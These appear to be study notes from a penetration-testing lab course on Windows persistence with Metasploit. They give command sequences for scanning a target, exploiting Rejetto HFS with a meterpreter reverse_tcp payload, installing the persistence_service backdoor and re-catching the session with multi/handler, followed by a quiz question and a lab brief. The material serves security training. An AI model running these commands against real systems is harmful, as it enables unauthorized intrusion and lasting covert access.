
- Persistence - Used to keep access to a system


Setup msfconsole
```
service postgresql start && msfconsole
workspace -a persistence
setg RHOST <target_ip>
setg LHOST <local_ip>
setg RHOSTS <target_ip>
```

Setup exploit
```
db_nmap -sC -sV <target_host>
search rejetto 
use exploit/windows/http/rejetto_hfs_exec
set payload windows/x64/meterpreter/reverse_tcp
exploit
```

Setup persistence module
```
search platform:windows persistence
use exploit/windows/local/persistence_service
set payload windows/meterpreter/reverse_tcp
set SESSION 1
exploit
```

Get back session
```
use multi/handler
set payload windows/meterpreter/reverse_tcp
exploit
```
## Quiz

Which one of the following MSF module options is used to set the session ID?

	set SESSION
## Lab

A Kali GUI machine and a target machine running a vulnerable server are provided to you. The IP address of the target machine is provided in a text file named target placed on the Desktop of the Kali machine (/root/Desktop/target). 

Your task is to fingerprint the application using the tools available on the Kali machine and exploit the application using the appropriate Metasploit module.

Then, use the exploit/windows/local/persistence_service local exploit module to maintain access.

Objective: Exploit the application and maintain access using the Metasploit module.

Instructions:

- Your Kali machine has an interface with IP address 10.10.X.Y. Run “ip addr” to know the values of X and Y.
- The IP address of the target machine is mentioned in the file “/root/Desktop/target”
- Do not attack the gateway located at IP address 192.V.W.1 and 10.10.X.1


```
Local IP 10.10.22.4
Remote IP 10.4.24.118
```